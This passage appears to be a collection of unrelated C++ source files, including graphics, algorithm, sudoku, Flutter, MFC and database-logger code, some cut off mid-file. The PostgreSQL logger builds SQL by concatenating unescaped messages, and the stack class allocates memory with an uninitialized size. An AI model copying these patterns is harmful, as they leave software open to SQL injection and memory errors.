WriteColorRounding) {\n  // Values that when multiplied by 256 are not integers\n  color c(0.00390625, 0.5, 0.99609375); // 1/256, 0.5, 255/256\n  std::stringstream ss;\n  write_color(ss, c);\n\n  // Expected byte values:\n  // r: sqrt(0.00390625) = 0.0625 * 256 = 16\n  // g: sqrt(0.5) \u2248 0.7071 * 256 \u2248 181\n  // b: clamp(sqrt(0.99609375)) \u2248 clamp(0.998046875) => 0.998046875 * 256 \u2248\n  // 255.0\n  EXPECT_EQ(ss.str(), \"16 181 255\\n\");\n}\n",
    "class Solution {\npublic:\n    vector<string> stringMatching(vector<string> &words) {\n        vector<string> matchingWords;\n\n        for (int i = 0; i < words.size(); i++) {\n            vector<int> lps = computeLPSArray(words[i]);\n            // Compare the current word with all other words.\n            for (int j = 0; j < words.size(); j++) {\n                if (i == j) continue;  // Skip comparing the word with itself.\n\n                // Check if the current word is a substring of another word.\n                if (isSubstringOf(words[i], words[j], lps)) {\n                    matchingWords.push_back(words[i]);\n                    break;  // No need to check further for this word.\n                }\n            }\n        }\n\n        return matchingWords;\n    }\n\nprivate:\n    // Function to compute the LPS (Longest Prefix Suffix) array for the\n    // substring `sub`.\n    vector<int> computeLPSArray(string &sub) {\n        vector<int> lps(sub.size(), 0);  // Initialize the LPS array with 0.\n        int currentIndex = 1;            // Start from the second character.\n        int len =\n            0;  // Length of the current longest prefix which is also a suffix.\n\n        while (currentIndex < sub.size()) {\n            if (sub[currentIndex] == sub[len]) {\n                len++;  // If the current characters match, extend the prefix.\n                lps[currentIndex] = len;  // Store the length of the prefix.\n                currentIndex++;\n            } else {\n                if (len > 0) {\n                    len = lps[len - 1];  // Backtrack using LPS array to find a\n                                         // shorter match.\n                } else {\n                    currentIndex++;\n                }\n            }\n        }\n        return lps;\n    }\n\n    // Function to check if `sub` is a substring of `main` using the KMP\n    // algorithm.\n    bool isSubstringOf(string &sub, string &main, vector<int> &lps) {\n        int i = 0;  // Pointer for `main`.\n        int j = 0;  // Pointer for `sub`.\n\n        while (i < main.size()) {\n            if (main[i] == sub[j]) {\n                i++;\n                j++;\n                if (j == sub.size()) return true;  // Found a match.\n            } else {\n                if (j > 0) {\n                    // Use the LPS to skip unnecessary comparisons.\n                    j = lps[j - 1];\n                } else {\n                    i++;\n                }\n            }\n        }\n        return false;  // No match found.\n    }\n};\n\n// class Solution {\n// public:\n//     vector<string> stringMatching(vector<string>& words) {\n//         vector<string>result;\n//         int n = words.size();\n//         for (int i =0 ; i<n; i++){\n//             for(int j=0; j<n;j++){\n//                 if(i==j) continue;\n\n//                 //npos\n//                 if(words[j].find(words[i])!= string:: npos){\n//                     result.push_back(words[i]);\n//                     break;\n//                 }\n//             }\n//         }\n//         return result;\n\n        \n//     }\n// };\n",
    "#include \"lve_pipeline.hpp\"\n#include <fstream>\n#include <stdexcept>\n#include <vector>\n#include <iostream>\n\n\nusing namespace std;\n\nnamespace lve {\n\n    LvePipeline::LvePipeline(const string& vertFilepath, const string& fragFilepath) {\n        createGraphicsPipeline(vertFilepath, fragFilepath);\n    }\n\n\n    vector<char> LvePipeline::readFile(const string& filepath) {\n        //\n    \n        fstream file(filepath, ios::ate | ios::binary);\n    \n        if (!file.is_open()) {\n            throw runtime_error(\"U get in troubles: \" + filepath);\n    \n\n        }   \n        size_t fileSize = static_cast<size_t>(file.tellg());\n        vector<char> buffer(fileSize);\n\n        file.seekg(0);\n        file.read(buffer.data(), fileSize);\n        file.close();\n\n        return buffer;\n    }\n    void LvePipeline::createGraphicsPipeline(const string& vertFilepath, const string& fragFilepath) {\n        auto vertCode = readFile(vertFilepath);\n        auto fragCode = readFile(fragFilepath);\n\n        cout << \"Vertex Shader Code Size: \" << vertCode.size() << '\\n';\n        cout << \"Fragment Shader Code Size: \" << fragCode.size() << '\\n';\n\n    }\n\n}",
    "#include \"LogPostgresql.h\"\n#include <fstream>\n#include <iostream>\n#include <ctime>\n#include <libpq-fe.h>\n#include <sstream>\n\nnamespace LPG{\n\n    const char* Logger::getDateTime__() const{\n        time_t timestamp = time(0);\n        time(&timestamp);\n        char* dt = ctime(&timestamp);\n        dt[24] = '\\0';\n        return dt;\n    }\n\n    void Logger::connection__()\n    {\n        std::ifstream file;\n        file.open(configFile_,std::ios_base::binary);\n        if (!file.is_open())\n        {\n            std::cerr << getDateTime__()<<\" [ERROR] Can't open config file \" << configFile_ << std::endl;\n            status_ = Status_::ERROR;\n            return;\n        }\n        char line[1024];\n        file.read(line, 1024);\n        for (size_t i=0;i<1024;++i)\n        {\n            if (line[i]=='p' and line[i+1]=='o' and line[i+2]=='r'\n                and line[i+3]=='t' and line[i+4]=='=')\n            {\n                line[i+9] = '\\0';\n                break;\n            }\n        }\n        conn_ = PQconnectdb(line);\n        if (PQstatus(conn_) != CONNECTION_OK) {\n            std::cerr << getDateTime__()<<\" [ERROR] Can't connect to database: \" << PQerrorMessage(conn_) << std::endl;\n            PQfinish(conn_);\n            status_ = Status_::ERROR;\n            return;\n        }\n    }\n\n    Logger::Logger(const char* configFile): status_(Status_::NORMAL), configFile_(configFile)\n    {\n        connection__();\n        if (status_ == Status_::ERROR) return;\n        res_ = PQexec(conn_, \"DO $$ BEGIN CREATE TYPE LogLevel AS ENUM ('DEBUG', 'INFO','NOTICE', 'WARNING', 'ERROR', 'CRITICAL', 'ALERT', 'EMERGENCY'); EXCEPTION WHEN duplicate_object THEN null; END $$;\");\n        if (PQresultStatus(res_) != PGRES_COMMAND_OK) {\n            std::cerr <<getDateTime__()<<\" [ERROR] Error of creating type: \" << PQerrorMessage(conn_) << std::endl;\n            PQclear(res_);\n            PQfinish(conn_);\n            status_ = Status_::ERROR;\n            return;\n        }\n        PQclear(res_);\n        res_ =\n            PQexec(conn_, \"CREATE TABLE IF NOT EXISTS Logs (dateTime TIMESTAMP DEFAULT now(), level LogLevel, message TEXT);\");\n        if (PQresultStatus(res_) != PGRES_COMMAND_OK) {\n            std::cerr <<getDateTime__()<<\" [ERROR] Error of creating table: \" << PQerrorMessage(conn_) << std::endl;\n            PQclear(res_);\n            PQfinish(conn_);\n            status_ = Status_::ERROR;\n            return;\n        }\n        PQclear(res_);\n    }\n\n    Logger::~Logger()\n    {\n        if (status_ == Status_::ERROR)\n        {\n            std::cerr << getDateTime__()<<\" [ERROR] Some problem in the past - logger\" << std::endl;\n            return;\n        }\n        PQfinish(conn_);\n    }\n\n    Logger::Logger(const Logger& other)\n    {\n        conn_=nullptr;\n        res_=nullptr;\n        status_=other.status_;\n        configFile_=other.configFile_;\n        if (status_ == Status_::NORMAL)\n        {\n            connection__();\n        }\n    }\n\n    void Logger::swap__(Logger& other)\n    {\n        std::swap(conn_,other.conn_);\n        std::swap(res_,other.res_);\n        std::swap(status_,other.status_);\n    }\n\n    Logger& Logger::operator=(const Logger& other)\n    {\n        if (this != &other)\n        {\n            Logger tmp(other);\n            swap__(tmp);\n        }\n        return *this;\n    }\n\n    Logger::Logger(Logger&& other)\n    {\n        if (other.status_ == Status_::ERROR)\n        {\n            status_ = Status_::ERROR;\n            conn_=other.conn_=nullptr;\n            res_=other.res_=nullptr;\n        } else\n        {\n            swap__(other);\n            other.status_=Status_::ERROR;\n            other.conn_=nullptr;\n            other.res_=nullptr;\n        }\n    }\n\n    Logger& Logger::operator=(Logger&& other)\n    {\n        if (this != &other)\n        {\n            swap__(other);\n            other.status_=Status_::ERROR;\n            other.conn_=nullptr;\n            other.res_=nullptr;\n        }\n        return *this;\n    }\n\n\n    void Logger::sendToDb__(const char* logLevel, const char* message)\n    {\n        std::stringstream ss;\n        ss<<\"INSERT INTO Logs (dateTime, level, message) VALUES (now(), '\"<<logLevel<<\"', '\"<<message<<\"');\";\n        res_=PQexec(conn_, ss.str().c_str());\n        if (PQresultStatus(res_) != PGRES_COMMAND_OK)\n        {\n            std::cerr << getDateTime__()<<\" [ERROR] Error of inserting into database: \" << PQerrorMessage(conn_) << std::endl;\n            PQclear(res_);\n            PQfinish(conn_);\n            status_ = Status_::ERROR;\n            return;\n        }\n        PQclear(res_);\n    }\n\n\n    void Logger::debug(const char* message)\n    {\n        if (status_ == Status_::ERROR)\n        {\n            std::cerr << getDateTime__()<<\" [ERROR] Some problem in the past - logger\" << std::endl;\n            return;\n        }\n        std::cout << getDateTime__()<<\" [DEBUG] \" << message << std::endl;\n        sendToDb__(\"DEBUG\", message);\n    }\n\n    void Logger::info(const char* message)\n    {\n        if (status_ == St",
    "#include<iostream>\nusing namespace std;\nclass Stack{\nprivate:\n    int top;\n    int *arr;\n    int count;\n    int capacity;\n\npublic:\n    Stack(int size)\n    {\n        this->top = -1;\n        this->arr = new int[capacity];\n        this->count = 0;\n        this->capacity = size;\n    }\n    void push(int);\n    void pop();\n    void display();\n    bool isEmpty();\n    bool isfull();\n    void size();\n};\nvoid Stack::push(int data){\n    if (this->top == (capacity-1)){\n        cout << \"stack is overflow : \"<<endl;\n        return;\n    }\n    \n    this->top++;\n    this->arr[top] = data;\n    this->count++;\n}\nvoid Stack::pop(){\n    if(this->top == -1){\n        cout << \"The stack is empty \";\n        return;\n    }\n    else{\n        this->top = 0;\n        this->top--;\n    }\n        this->count--;\n}\nvoid Stack::display(){\n    if(this->top == -1){\n        cout << \"The stack is empty \";\n        return;\n    }\n\n    for (int i = this->top; i >= 0; i--)\n    {\n        cout << this->arr[i] << \" \";\n    }\n    cout << endl;\n}\nbool Stack::isEmpty(){\n    if(this->top == -1){\n        cout << \"The stack is empty \";\n        return true;\n    }\n    else{\n        cout << \"The stack is't  empty \";\n        return false;\n    }\n}\nbool Stack::isfull(){\n    if(this->top == capacity-1){\n        cout << \"Stack is full..\";\n        return true;\n    }\n    else{\n        cout << \"Stack is't full\";\n        return false;\n    }\n}\nvoid Stack :: size(){\n    cout << \"The size is stack is :\"<< this->count;\n}\n\nint main(){\n    Stack s1(4);\n    int choice;\n\n    do{\n        cout << \"\\n--------------Choices---------------\"<< endl;\n        cout << \"Enter 1 for push :\"<< endl;\n        cout << \"Enter 2 for pop :\"<< endl;\n        cout << \"Enter 3 for display :\"<< endl;\n        cout << \"Enter 4 for chaque whether stack is Empty:\"<< endl;\n        cout << \"Enter 5 for chaque whether stack is Full:\"<< endl;\n        cout << \"Enter 6 for Get size :\"<< endl;\n        cout << \"--------------Choices---------------\"<< endl << endl;\n        cout << \"Enter your choice :\";\n        cin >> choice;\n    \n        switch(choice){\n            case 1:{\n                int data;\n\n                cout << \"Enter your data :\";\n                cin >> data;\n\n                s1.push(data);\n                break;\n            }\n            case 2:{\n                s1.pop();\n                break;\n            }\n            case 3:{\n                s1.display();\n                break;\n            }\n            case 4:{\n                s1.isEmpty();\n                break;\n            }\n            case 5:{\n                s1.isfull();\n                break;\n            }\n            case 6:{\n                s1.size();\n                break;\n            }\n        }\n\n    }while(choice != 0);\n\nreturn 0;\n}",
    "/**\n*\n* Date: 1-1-2025\n* Author: Jeremiah J.\n* File: Main.hpp\n* Description: This is the main entry point for the program.\n* \n*/\n#include \"PrettyPrint.hpp\"\n#include \"Deserializer.hpp\"\n#include <fstream>\n\nint main(int argc, char* argv[]) {\n    if (argc != 2) {\n        std::cerr << \"Usage: \" << argv[0] << \" <file>\" << std::endl;\n        return 1;\n    }\n\n    const char* inputFile = argv[1];\n    std::ifstream file(inputFile, std::ios::binary);\n\n    if (!file.is_open()) {\n        std::cerr << \"Error: Unable to open file \" << inputFile << std::endl;\n        return 1;\n    }\n\n    std::vector<uint8_t> bytecode(\n        (std::istreambuf_iterator<char>(file)),\n        std::istreambuf_iterator<char>()\n    );\n\n    try {\n        Deserializer deserializer(bytecode);\n        auto [header, proto] = deserializer.Parse();\n\n        PrintHeader(header);\n        PrintPrototype(proto);    \n    }\n    catch (const std::exception& e) {\n        std::cerr << \"Error: \" << e.what() << std::endl;\n        return 1;\n    }\n\n    return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"event_management\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n//#include <windows.h>\nusing namespace std;\nint board[4][4] = {\n    {0, 0, 1, 0},\n    {0, 4, 0, 0},\n    {0, 0, 2, 0},\n    {0, 1, 0, 0},\n};\nbool error[4][4] = {false};\nbool no_error[4][4]= {true};\nbool editable[4][4];\nint cur_r = 0, cur_c = 0;\nvoid check_horizontal() {\n    bool seen[5] = {0, 0, 0, 0, 0}; // \u7528\u4f86\u8ffd\u8e64\u6578\u5b57 1-4 \u662f\u5426\u5df2\u51fa\u73fe\n    bool conflict = false;         // \u6a19\u8a18\u662f\u5426\u6709\u91cd\u8907\n    bool allFilled = true;         // \u6a19\u8a18\u662f\u5426\u6574\u5217\u586b\u6eff\n    for (int i = 0; i < 4; ++i) {\n        if (board[cur_r][i] == 0) {\n            allFilled = false; // \u5982\u679c\u6709\u7a7a\u683c\uff0c\u6a19\u8a18\u70ba\u672a\u586b\u6eff\n        } else if (!seen[board[cur_r][i]]) {\n            seen[board[cur_r][i]] = true; // \u6a19\u8a18\u6578\u5b57\u5df2\u51fa\u73fe\n        } else {\n            conflict = true; // \u82e5\u6578\u5b57\u5df2\u91cd\u8907\u51fa\u73fe\uff0c\u6a19\u8a18\u885d\u7a81\n        }\n    }\n    // \u5982\u679c\u6574\u5217\u586b\u6eff\u4e14\u7121\u91cd\u8907\u6578\u5b57\n    if (allFilled && !conflict) {\n        for (int i = 0; i < 4; ++i) {\n            no_error[cur_r][i] = true;  // \u6a19\u8a18\u70ba\u6b63\u78ba\uff08\u7da0\u8272\uff09\n            error[cur_r][i] = false;   // \u6e05\u9664\u932f\u8aa4\uff08\u7d05\u8272\uff09\n        }\n    } else {\n        // \u5982\u679c\u672a\u586b\u6eff\u6216\u6709\u91cd\u8907\u6578\u5b57\uff0c\u6a19\u8a18\u70ba\u932f\u8aa4\uff08\u7d05\u8272\uff09\n        for (int i = 0; i < 4; ++i) {\n            no_error[cur_r][i] = false; // \u6e05\u9664\u6b63\u78ba\u6a19\u8a18\n            error[cur_r][i] = true;     // \u6a19\u8a18\u932f\u8aa4\uff08\u7d05\u8272\uff09\n        }\n    }\n    if (conflict) {\n            for (int i = 0; i < 4; ++i) {\n                error[cur_r][i] = true;\n            }\n        } else if (allFilled && !conflict) {\n            // \u5982\u679c\u6574\u5217\u586b\u6eff\u4e14\u7121\u91cd\u8907\u6578\u5b57\uff0c\u6a19\u8a18\u70ba\u6b63\u78ba\n            for (int i = 0; i < 4; ++i) {\n                error[cur_r][i] = false;\n            }\n        } else {\n            // \u82e5\u6709\u7a7a\u683c\u4f46\u7121\u885d\u7a81\uff0c\u4ecd\u6a19\u8a18\u70ba\u975e\u932f\u8aa4\u72c0\u614b\n            for (int i = 0; i < 4; ++i) {\n                error[cur_r][i] = false;\n            }\n        }\n}\n    /* TODO: Check if a horizontal line has conflict number, or is finished. */\nvoid check_vertical()\n{\n        bool seen[5] = {0, 0, 0, 0, 0};\n        bool conflict = false;\n        bool allFilled = true;\n    for (int i = 0; i < 4; ++i) {\n        if (board[i][cur_c] == 0) {\n            allFilled = false; // \u5982\u679c\u6709\u7a7a\u683c\uff0c\u6a19\u8a18\u70ba\u672a\u586b\u6eff\n        } else if (!seen[board[i][cur_c]]) {\n            seen[board[i][cur_c]] = true; // \u6a19\u8a18\u6578\u5b57\u5df2\u51fa\u73fe\n        } else {\n            conflict = true; // \u82e5\u6578\u5b57\u5df2\u91cd\u8907\u51fa\u73fe\uff0c\u6a19\u8a18\u885d\u7a81\n        }\n    }\n    // \u5982\u679c\u6574\u5217\u586b\u6eff\u4e14\u7121\u91cd\u8907\u6578\u5b57\n    if (allFilled && !conflict) {\n        for (int i = 0; i < 4; ++i) {\n            no_error[i][cur_c] = true;  // \u6a19\u8a18\u70ba\u6b63\u78ba\uff08\u7da0\u8272\uff09\n            error[i][cur_c] = false;   // \u6e05\u9664\u932f\u8aa4\uff08\u7d05\u8272\uff09\n        }\n    } else {\n        // \u5982\u679c\u672a\u586b\u6eff\u6216\u6709\u91cd\u8907\u6578\u5b57\uff0c\u6a19\u8a18\u70ba\u932f\u8aa4\uff08\u7d05\u8272\uff09\n        for (int i = 0; i < 4; ++i) {\n            no_error[i][cur_c] = false; // \u6e05\u9664\u6b63\u78ba\u6a19\u8a18\n            error[i][cur_c] = true;     // \u6a19\u8a18\u932f\u8aa4\uff08\u7d05\u8272\uff09\n        }\n    }\n    if (conflict) {\n            for (int i = 0; i < 4; ++i) {\n                error[i][cur_c] = true;\n            }\n        } else if (allFilled && !conflict) {\n            // \u5982\u679c\u6574\u5217\u586b\u6eff\u4e14\u7121\u91cd\u8907\u6578\u5b57\uff0c\u6a19\u8a18\u70ba\u6b63\u78ba\n            for (int i = 0; i < 4; ++i) {\n                error[i][cur_c] = false;\n            }\n        } else {\n            // \u82e5\u6709\u7a7a\u683c\u4f46\u7121\u885d\u7a81\uff0c\u4ecd\u6a19\u8a18\u70ba\u975e\u932f\u8aa4\u72c0\u614b\n            for (int i = 0; i < 4; ++i) {\n                error[i][cur_c] = false;\n            }\n        }\n    }\nvoid check_block() {\n    for (int startRow = 0; startRow < 4; startRow += 2) {\n         for (int startCol = 0; startCol < 4; startCol += 2) {\n             bool seen[5] = {0, 0, 0, 0, 0}; // \u7528\u4f86\u8ffd\u8e64\u6578\u5b57 1-4 \u662f\u5426\u5df2\u51fa\u73fe\n             bool conflict = false;         // \u6a19\u8a18\u662f\u5426\u6709\u885d\u7a81\n             bool allFilled = true;         // \u6a19\u8a18\u662f\u5426\u6574\u500b\u5340\u584a\u5df2\u586b\u6eff\n             // \u6aa2\u67e5 2x2 \u5340\u584a\u662f\u5426\u6709\u91cd\u8907\u6578\u5b57\u6216\u7a7a\u683c\n             for (int i = startRow; i < startRow + 2; ++i) {\n                 for (int j = startCol; j < startCol + 2; ++j) {\n                     int num = board[i][j];\n                     if (num == 0) {\n                         allFilled = false; // \u5982\u679c\u6709 0\uff0c\u6a19\u8a18\u70ba\u672a\u586b\u6eff\n                     } else if (!seen[num]) {\n                         seen[num] = true;  // \u6a19\u8a18\u6578\u5b57\u5df2\u51fa\u73fe\n                     } else {\n                         conflict = true;    // \u5982\u679c\u6578\u5b57\u91cd\u8907\uff0c\u6a19\u8a18\u885d\u7a81\n                     }\n                 }\n             }\n             // \u5982\u679c\u6709\u885d\u7a81\uff0c\u5c07\u5340\u584a\u5167\u7684\u932f\u8aa4\u683c\u5b50\u6a19\u8a18\u70ba\u7d05\u8272\n             if (conflict) {\n                 for (int i = startRow; i < startRow + 2; ++i) {\n                     for (int j = startCol; j < startCol + 2; ++j) {\n                         error[i][j] = true;  // \u6a19\u8a18\u70ba\u932f\u8aa4\uff08\u7d05\u8272\uff09\n                         no_error[i][j] = false;  // \u6e05\u9664\u6b63\u78ba\u6a19\u8a18\n                     }\n                 }\n             } else if (allFilled) {\n                 // \u5982\u679c\u5340\u584a\u5df2\u586b\u6eff\u4e14\u7121\u885d\u7a81\uff0c\u5c07\u5340\u584a\u5167\u7684\u683c\u5b50\u6a19\u8a18\u70ba\u6b63\u78ba\n                for (int i = startRow; i < startRow + 2; ++i) {\n                     for (int j = startCol; j < startCol + 2; ++j) {\n                        no_error[i][j] = true;  // \u6a19\u8a18\u70ba\u6b63\u78ba\uff08\u7da0\u8272\uff09\n                        error[i][j] = false;    // \u6e05\u9664\u932f\u8aa4\u6a19\u8a18\n                     }\n               }\n            } else {\n                 // \u5982\u679c\u5340\u584a\u9084\u6c92\u586b\u6eff\uff0c\u4e14\u6c92\u6709\u885d\u7a81\uff0c\u6e05\u9664\u932f\u8aa4\u6a19\u8a18\n                for (int i = startRow; i < startRow + 2; ++i) {\n                     for (int j = startCol; j < startCol + 2; ++j) {\n                       error[i][j] = false;    // \u6e05\u9664\u932f\u8aa4\u6a19\u8a18\n                   }\n                }\n            }\n         }\n    }\n }\n   \n        /* TODO: Check if a block has conflict number, or is finished. */\n\n        \nvoid fill_number(int c)",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"final_sample_fall2024\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "\ufeff\n// MFCApplication1.cpp: \uc560\ud50c\ub9ac\ucf00\uc774\uc158\uc5d0 \ub300\ud55c \ud074\ub798\uc2a4 \ub3d9\uc791\uc744 \uc815\uc758\ud569\ub2c8\ub2e4.\n//\n\n#include \"pch.h\"\n#include \"framework.h\"\n#include \"MFCApplication1.h\"\n#include \"MFCApplication1Dlg.h\"\n\n#ifdef _DEBUG\n#define new DEBUG_NEW\n#endif\n\n\n// CMFCApplication1App\n\nBEGIN_MESSAGE_MAP(CMFCApplication1App, CWinApp)\n\tON_COMMAND(ID_HELP, &CWinApp::OnHelp)\nEND_MESSAGE_MAP()\n\n\n// CMFCApplication1App \uc0dd\uc131\n\nCMFCApplication1App::CMFCApplication1App()\n{\n\t// \ub2e4\uc2dc \uc2dc\uc791 \uad00\ub9ac\uc790 \uc9c0\uc6d0\n\tm_dwRestartManagerSupportFlags = AFX_RESTART_MANAGER_SUPPORT_RESTART;\n\n\t// TODO: \uc5ec\uae30\uc5d0 \uc0dd\uc131 \ucf54\ub4dc\ub97c \ucd94\uac00\ud569\ub2c8\ub2e4.\n\t// InitInstance\uc5d0 \ubaa8\ub4e0 \uc911\uc694\ud55c \ucd08\uae30\ud654 \uc791\uc5c5\uc744 \ubc30\uce58\ud569\ub2c8\ub2e4.\n}\n\n\n// \uc720\uc77c\ud55c CMFCApplication1App \uac1c\uccb4\uc785\ub2c8\ub2e4.\n\nCMFCApplication1App theApp;\n\n\n// CMFCApplication1App \ucd08\uae30\ud654\n\nBOOL CMFCApplication1App::InitInstance()\n{\n\t// Windows XP\uc5d0\uc11c\ub294 InitCommonControlsEx()\ub97c \ud544\uc694\ub85c \ud569\ub2c8\ub2e4.\n\t// \uc0ac\uc6a9\ud558\ub3c4\ub85d \uc9c0\uc815\ud558\ub294 \uacbd\uc6b0, Windows XP \uc0c1\uc5d0\uc11c \ubc18\ub4dc\uc2dc InitCommonControlsEx()\uac00 \ud544\uc694\ud569\ub2c8\ub2e4.\n\t// InitCommonControlsEx()\ub97c \uc0ac\uc6a9\ud558\uc9c0 \uc54a\uc73c\uba74 \ucc3d\uc744 \ub9cc\ub4e4 \uc218 \uc5c6\uc2b5\ub2c8\ub2e4.\n\tINITCOMMONCONTROLSEX InitCtrls;\n\tInitCtrls.dwSize = sizeof(InitCtrls);\n\t// \uc751\uc6a9 \ud504\ub85c\uadf8\ub7a8\uc5d0\uc11c \uc0ac\uc6a9\ud560 \ubaa8\ub4e0 \uacf5\uc6a9 \ucee8\ud2b8\ub864 \ud074\ub798\uc2a4\ub97c \ud3ec\ud568\ud558\ub3c4\ub85d\n\t// \uc774 \ud56d\ubaa9\uc744 \uc124\uc815\ud558\uc2ed\uc2dc\uc624.\n\tInitCtrls.dwICC = ICC_WIN95_CLASSES;\n\tInitCommonControlsEx(&InitCtrls);\n\n\tCWinApp::InitInstance();\n\n\n\tAfxEnableControlContainer();\n\n\t// \ub300\ud654 \uc0c1\uc790\uc5d0 \uc178 \ud2b8\ub9ac \ubdf0 \ub610\ub294\n\t// \uc178 \ubaa9\ub85d \ubdf0 \ucee8\ud2b8\ub864\uc774 \ud3ec\ud568\ub418\uc5b4 \uc788\ub294 \uacbd\uc6b0 \uc178 \uad00\ub9ac\uc790\ub97c \ub9cc\ub4ed\ub2c8\ub2e4.\n\tCShellManager *pShellManager = new CShellManager;\n\n\t// MFC \ucee8\ud2b8\ub864\uc758 \ud14c\ub9c8\ub97c \uc0ac\uc6a9\ud558\uae30 \uc704\ud574 \"Windows \uc6d0\ud615\" \ube44\uc8fc\uc5bc \uad00\ub9ac\uc790 \ud65c\uc131\ud654\n\tCMFCVisualManager::SetDefaultManager(RUNTIME_CLASS(CMFCVisualManagerWindows));\n\n\t// \ud45c\uc900 \ucd08\uae30\ud654\n\t// \uc774\ub4e4 \uae30\ub2a5\uc744 \uc0ac\uc6a9\ud558\uc9c0 \uc54a\uace0 \ucd5c\uc885 \uc2e4\ud589 \ud30c\uc77c\uc758 \ud06c\uae30\ub97c \uc904\uc774\ub824\uba74\n\t// \uc544\ub798\uc5d0\uc11c \ud544\uc694 \uc5c6\ub294 \ud2b9\uc815 \ucd08\uae30\ud654\n\t// \ub8e8\ud2f4\uc744 \uc81c\uac70\ud574\uc57c \ud569\ub2c8\ub2e4.\n\t// \ud574\ub2f9 \uc124\uc815\uc774 \uc800\uc7a5\ub41c \ub808\uc9c0\uc2a4\ud2b8\ub9ac \ud0a4\ub97c \ubcc0\uacbd\ud558\uc2ed\uc2dc\uc624.\n\t// TODO: \uc774 \ubb38\uc790\uc5f4\uc744 \ud68c\uc0ac \ub610\ub294 \uc870\uc9c1\uc758 \uc774\ub984\uacfc \uac19\uc740\n\t// \uc801\uc808\ud55c \ub0b4\uc6a9\uc73c\ub85c \uc218\uc815\ud574\uc57c \ud569\ub2c8\ub2e4.\n\tSetRegistryKey(_T(\"\ub85c\uceec \uc560\ud50c\ub9ac\ucf00\uc774\uc158 \ub9c8\ubc95\uc0ac\uc5d0\uc11c \uc0dd\uc131\ub41c \uc560\ud50c\ub9ac\ucf00\uc774\uc158\"));\n\n\tCMFCApplication1Dlg dlg;\n\tm_pMainWnd = &dlg;\n\tINT_PTR nResponse = dlg.DoModal();\n\tif (nResponse == IDOK)\n\t{\n\t\t// TODO: \uc5ec\uae30\uc5d0 [\ud655\uc778]\uc744 \ud074\ub9ad\ud558\uc5ec \ub300\ud654 \uc0c1\uc790\uac00 \uc5c6\uc5b4\uc9c8 \ub54c \ucc98\ub9ac\ud560\n\t\t//  \ucf54\ub4dc\ub97c \ubc30\uce58\ud569\ub2c8\ub2e4.\n\t}\n\telse if (nResponse == IDCANCEL)\n\t{\n\t\t// TODO: \uc5ec\uae30\uc5d0 [\ucde8\uc18c]\ub97c \ud074\ub9ad\ud558\uc5ec \ub300\ud654 \uc0c1\uc790\uac00 \uc5c6\uc5b4\uc9c8 \ub54c \ucc98\ub9ac\ud560\n\t\t//  \ucf54\ub4dc\ub97c \ubc30\uce58\ud569\ub2c8\ub2e4.\n\t}\n\telse if (nResponse == -1)\n\t{\n\t\tTRACE(traceAppMsg, 0, \"\uacbd\uace0: \ub300\ud654 \uc0c1\uc790\ub97c \ub9cc\ub4e4\uc9c0 \ubabb\ud588\uc73c\ubbc0\ub85c \uc560\ud50c\ub9ac\ucf00\uc774\uc158\uc774 \uc608\uae30\uce58 \uc54a\uac8c \uc885\ub8cc\ub429\ub2c8\ub2e4.\\n\");\n\t\tTRACE(traceAppMsg, 0, \"\uacbd\uace0: \ub300\ud654 \uc0c1\uc790\uc5d0\uc11c MFC \ucee8\ud2b8\ub864\uc744 \uc0ac\uc6a9\ud558\ub294 \uacbd\uc6b0 #define _AFX_NO_MFC_CONTROLS_IN_DIALOGS\ub97c \uc218\ud589\ud560 \uc218 \uc5c6\uc2b5\ub2c8\ub2e4.\\n\");\n\t}\n\n\t// \uc704\uc5d0\uc11c \ub9cc\ub4e0 \uc178 \uad00\ub9ac\uc790\ub97c \uc0ad\uc81c\ud569\ub2c8\ub2e4.\n\tif (pShellManager != nullptr)\n\t{\n\t\tdelete pShellManager;\n\t}\n\n#if !defined(_AFXDLL) && !defined(_AFX_NO_MFC_CONTROLS_IN_DIALOGS)\n\tControlBarCleanUp();\n#endif\n\n\t// \ub300\ud654 \uc0c1\uc790\uac00 \ub2eb\ud614\uc73c\ubbc0\ub85c 